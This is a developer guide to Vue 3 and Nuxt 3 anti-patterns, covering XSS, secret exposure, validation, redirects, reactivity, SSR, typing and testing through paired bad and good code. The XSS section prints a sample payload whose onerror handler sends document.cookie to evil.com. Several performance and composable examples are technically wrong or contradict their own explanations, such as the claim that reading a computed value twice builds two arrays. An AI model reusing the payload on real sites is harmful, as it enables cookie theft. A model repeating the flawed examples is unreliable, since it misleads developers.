# Vue 3 / Nuxt 3 Anti-Patterns and Common Mistakes

This document catalogs common mistakes and anti-patterns to avoid when developing Vue 3 and Nuxt 3 applications, with emphasis on security and performance implications.

## 1. Critical Security Anti-Patterns

### Never: Use v-html with Unsanitized Input

**Risk Level**: CRITICAL - Direct XSS vulnerability

```vue
<!-- ❌ DANGEROUS - XSS vulnerability -->
<div v-html="userProvidedContent" />

<!-- ✅ SECURE - Sanitized content -->
<div v-html="sanitizeHTML(userProvidedContent)" />

<!-- ✅ BEST - Plain text when HTML not needed -->
<span v-text="userProvidedContent" />
```

**Why This Matters**:
- `v-html` renders raw HTML without any sanitization
- Malicious users can inject `<script>` tags or event handlers
- Can lead to session hijacking, data theft, or malware injection

**Example Attack**:
```typescript
// Attacker provides this as input
const malicious = '<img src=x onerror="fetch(`https://evil.com?cookie=${document.cookie}`)">'

// This executes the attacker's code
<div v-html="malicious" />  // ❌ DANGEROUS
```

**Proper Solution**:
```typescript
import { useSanitize } from '@/composables/useSanitize'

const { sanitizeHTML } = useSanitize()
const safeContent = computed(() => sanitizeHTML(userProvidedContent.value))
```

### Never: Expose Secrets in Client Code

**Risk Level**: CRITICAL - Exposes sensitive credentials

```typescript
// ❌ DANGEROUS - Secret in public config
runtimeConfig: {
  public: {
    apiKey: process.env.API_KEY  // Exposed to client!
  }
}

// ✅ SECURE - Secrets stay server-side
runtimeConfig: {
  apiKey: process.env.API_KEY,  // Server only
  public: {
    apiBase: '/api'
  }
}
```

**Why This Matters**:
- Anything in `runtimeConfig.public` is sent to the client
- API keys, database credentials, secrets become visible in browser
- Attackers can extract and abuse these credentials

**How to Verify**:
```bash
# Check your build output
npm run build
# Inspect .output/public/_nuxt/*.js
# Search for sensitive strings - they shouldn't be there
```

**Proper Pattern**:
```typescript
// Server-side API route
export default defineEventHandler(async (event) => {
  const config = useRuntimeConfig(event)
  const apiKey = config.apiKey  // Only accessible on server

  const data = await fetch('https://api.service.com', {
    headers: { 'Authorization': `Bearer ${apiKey}` }
  })

  return data
})
```

### Never: Trust Client-Side Validation Alone

**Risk Level**: HIGH - Bypassed security controls

```typescript
// ❌ DANGEROUS - Client-only validation
const handleSubmit = () => {
  if (isValidEmail(email.value)) {
    $fetch('/api/subscribe', { body: { email: email.value } })
  }
}

// ✅ SECURE - Server-side validation
// server/api/subscribe.post.ts
export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const result = emailSchema.safeParse(body)
  if (!result.success) {
    throw createError({ statusCode: 400, message: 'Invalid email' })
  }
  // Process validated email
})
```

**Why This Matters**:
- Client-side code can be modified or bypassed
- Attackers can send requests directly to your API
- Must validate on server even if client validates

**Defense in Depth**:
```typescript
// Client validation (UX improvement)
const clientValidation = () => {
  if (!emailSchema.safeParse({ email: email.value }).success) {
    errors.value.email = 'Invalid email format'
    return false
  }
  return true
}

// Server validation (security requirement)
export default defineEventHandler(async (event) => {
  const body = await readBody(event)

  // ALWAYS validate on server
  const result = emailSchema.safeParse(body)
  if (!result.success) {
    throw createError({ statusCode: 400 })
  }

  await processEmail(result.data.email)
})
```

### Never: Construct URLs from User Input Without Validation

**Risk Level**: HIGH - Open redirect, SSRF vulnerabilities

```typescript
// ❌ DANGEROUS - Open redirect
const handleRedirect = (url: string) => {
  navigateTo(url)  // Attacker can redirect to evil.com
}

// ✅ SECURE - Validate against allowlist
const handleRedirect = (url: string) => {
  const allowedPaths = ['/dashboard', '/profile', '/settings']

  if (allowedPaths.includes(url)) {
    navigateTo(url)
  } else {
    throw createError({ statusCode: 400, message: 'Invalid redirect' })
  }
}

// ✅ SECURE - Validate URL structure
const handleRedirect = (url: string) => {
  try {
    const parsed = new URL(url, window.location.origin)

    // Only allow same-origin redirects
    if (parsed.origin === window.location.origin) {
      navigateTo(url)
    }
  } catch {
    throw createError({ statusCode: 400 })
  }
}
```

## 2. Performance Anti-Patterns

### Avoid: Reactive Arrays in Computed

```typescript
// ❌ BAD - Creates new array on every access
const filtered = computed(() => {
  return items.value.filter(i => i.active).sort()
})

// Accessing filtered.value twice creates two arrays
console.log(filtered.value.length)    // Array 1
console.log(filtered.value[0])        // Array 2

// ✅ GOOD - Memoized with stable reference
const filtered = computed(() => {
  const result = items.value.filter(i => i.active)
  result.sort((a, b) => a.name.localeCompare(b.name))
  return result
})
```

**Why This Matters**:
- Computed properties cache, but return value still matters
- Creating new arrays/objects on every access defeats caching
- Causes unnecessary re-renders in child components

### Avoid: Deep Reactivity on Large Objects

```typescript
// ❌ BAD - Deep reactivity overhead
const largeData = ref({
  users: new Array(1000).fill(null).map((_, i) => ({
    id: i,
    profile: { name: '', settings: {} }
  }))
})

// Creates 1000+ reactive proxies = slow

// ✅ GOOD - Use shallowRef for large data
const largeData = shallowRef({
  users: new Array(1000).fill(null).map((_, i) => ({
    id: i,
    profile: { name: '', settings: {} }
  }))
})

// Update entire object when changed
largeData.value = { ...newData }
```

### Avoid: Computed Properties with Side Effects

```typescript
// ❌ BAD - Side effect in computed
const processedData = computed(() => {
  fetch('/api/log').then(() => {})  // Side effect!
  return items.value.map(process)
})

// ✅ GOOD - Use watchers for side effects
const processedData = computed(() => {
  return items.value.map(process)
})

watch(processedData, (newData) => {
  fetch('/api/log', { body: { count: newData.length } })
})
```

**Why This Matters**:
- Computed properties should be pure functions
- Side effects in computed are hard to debug
- May execute unexpectedly during re-renders

### Avoid: Unnecessary Watchers

```typescript
// ❌ BAD - Watcher for derived state
const firstName = ref('John')
const lastName = ref('Doe')
const fullName = ref('')

watch([firstName, lastName], ([first, last]) => {
  fullName.value = `${first} ${last}`
})

// ✅ GOOD - Use computed instead
const fullName = computed(() => `${firstName.value} ${lastName.value}`)
```

## 3. Composition API Anti-Patterns

### Avoid: Mixing ref() and .value Inconsistently

```typescript
// ❌ BAD - Confusing ref usage
const count = ref(0)

function increment() {
  count++  // ❌ Doesn't work, count is a ref
}

function double() {
  return count * 2  // ❌ count is an object, not a number
}

// ✅ GOOD - Consistent .value usage
const count = ref(0)

function increment() {
  count.value++  // ✅ Modifies the ref value
}

function double() {
  return count.value * 2  // ✅ Reads the ref value
}
```

### Avoid: Losing Reactivity with Destructuring

```typescript
// ❌ BAD - Loses reactivity
const state = reactive({ count: 0, name: 'Test' })
const { count, name } = state  // count and name are now plain values

count++  // ❌ Doesn't update reactive state

// ✅ GOOD - Use toRefs to maintain reactivity
const state = reactive({ count: 0, name: 'Test' })
const { count, name } = toRefs(state)

count.value++  // ✅ Updates reactive state

// ✅ ALTERNATIVE - Access via state object
state.count++  // ✅ Updates reactive state
```

### Avoid: Recreating Reactive State on Every Render

```typescript
// ❌ BAD - Creates new ref on every function call
function useCounter() {
  const count = ref(0)  // New ref each time!
  return { count }
}

// ✅ GOOD - Composable with proper lifecycle
function useCounter() {
  const count = ref(0)

  const increment = () => count.value++

  return { count, increment }
}

// Use in component
const { count, increment } = useCounter()  // Called once in setup
```

## 4. Nuxt-Specific Anti-Patterns

### Avoid: Using Client-Only APIs During SSR

```typescript
// ❌ BAD - Crashes during SSR
const handleResize = () => {
  const width = window.innerWidth  // window undefined on server
}

// ✅ GOOD - Check for client environment
const handleResize = () => {
  if (process.client) {
    const width = window.innerWidth
  }
}

// ✅ BETTER - Use onMounted for client-only code
onMounted(() => {
  const width = window.innerWidth
  // Safe to use browser APIs here
})
```

### Avoid: Blocking Server Rendering

```typescript
// ❌ BAD - Blocks SSR
const data = ref(null)

// This runs on server and blocks rendering
await $fetch('/slow-api')

// ✅ GOOD - Use useAsyncData
const { data } = await useAsyncData('key', () => $fetch('/api/data'))

// ✅ ALTERNATIVE - Lazy load on client
onMounted(async () => {
  data.value = await $fetch('/api/data')
})
```

### Avoid: Ignoring Hydration Mismatches

```typescript
// ❌ BAD - Different content on server vs client
<template>
  <div>{{ Math.random() }}</div>  <!-- Different every render -->
</template>

// ✅ GOOD - Consistent content
<template>
  <div>{{ stableValue }}</div>
</template>

// ✅ GOOD - Use ClientOnly for client-specific content
<template>
  <ClientOnly>
    <div>{{ Math.random() }}</div>
  </ClientOnly>
</template>
```

## 5. State Management Anti-Patterns

### Avoid: Mutating Props Directly

```typescript
// ❌ BAD - Mutates parent's data
const props = defineProps<{ items: Item[] }>()

const addItem = (item: Item) => {
  props.items.push(item)  // ❌ Mutating prop!
}

// ✅ GOOD - Emit event to parent
const props = defineProps<{ items: Item[] }>()
const emit = defineEmits<{ 'add-item': [item: Item] }>()

const addItem = (item: Item) => {
  emit('add-item', item)  // ✅ Parent handles update
}
```

### Avoid: Sharing Reactive State Across Components Without Composables

```typescript
// ❌ BAD - Shared mutable state
// shared.ts
export const sharedState = reactive({ count: 0 })

// Hard to track, debug, and test

// ✅ GOOD - Use composable pattern
// composables/useSharedState.ts
const state = reactive({ count: 0 })

export function useSharedState() {
  const increment = () => state.count++

  return {
    count: readonly(state).count,
    increment
  }
}
```

## 6. TypeScript Anti-Patterns

### Avoid: Using `any` Types

```typescript
// ❌ BAD - Defeats TypeScript's purpose
const processData = (data: any) => {
  return data.map(item => item.value)  // No type safety
}

// ✅ GOOD - Proper typing
interface DataItem {
  value: number
  label: string
}

const processData = (data: DataItem[]) => {
  return data.map(item => item.value)  // Type-safe
}
```

### Avoid: Ignoring Type Errors with @ts-ignore

```typescript
// ❌ BAD - Hiding real issues
// @ts-ignore
const result = dangerousOperation()

// ✅ GOOD - Fix the underlying issue
const result = dangerousOperation() as ExpectedType

// ✅ BETTER - Type the function properly
function dangerousOperation(): ExpectedType {
  // Implementation
}
```

## 7. Testing Anti-Patterns

### Avoid: Testing Implementation Details

```typescript
// ❌ BAD - Tests implementation
it('calls internal method', () => {
  const wrapper = mount(Component)
  const spy = vi.spyOn(wrapper.vm, 'internalMethod')

  wrapper.vm.publicMethod()

  expect(spy).toHaveBeenCalled()
})

// ✅ GOOD - Tests behavior
it('displays result when action triggered', async () => {
  const wrapper = mount(Component)

  await wrapper.find('button').trigger('click')

  expect(wrapper.text()).toContain('Expected Result')
})
```

### Avoid: Not Testing Error Cases

```typescript
// ❌ BAD - Only tests happy path
it('fetches data', async () => {
  const data = await fetchData()
  expect(data).toBeDefined()
})

// ✅ GOOD - Tests error handling
describe('fetchData', () => {
  it('returns data on success', async () => {
    global.$fetch.mockResolvedValueOnce({ data: 'test' })

    const result = await fetchData()

    expect(result).toEqual({ data: 'test' })
  })

  it('handles network errors', async () => {
    global.$fetch.mockRejectedValueOnce(new Error('Network error'))

    await expect(fetchData()).rejects.toThrow('Network error')
  })

  it('handles invalid responses', async () => {
    global.$fetch.mockResolvedValueOnce(null)

    await expect(fetchData()).rejects.toThrow('Invalid response')
  })
})
```

## Quick Reference: Anti-Pattern Checklist

### Security
- [ ] Never use v-html with user input without sanitization
- [ ] Never expose secrets in runtimeConfig.public
- [ ] Never trust client-side validation alone
- [ ] Never construct URLs from user input without validation

### Performance
- [ ] Avoid creating new objects/arrays in computed properties
- [ ] Avoid deep reactivity on large data structures
- [ ] Avoid watchers when computed would work
- [ ] Avoid blocking operations during SSR

### Code Quality
- [ ] Avoid mutating props
- [ ] Avoid using `any` types
- [ ] Avoid testing implementation details
- [ ] Avoid ignoring hydration warnings

### Vue/Nuxt Specific
- [ ] Avoid losing reactivity with destructuring
- [ ] Avoid using browser APIs during SSR
- [ ] Avoid mixing ref/reactive inconsistently
- [ ] Avoid recreating reactive state
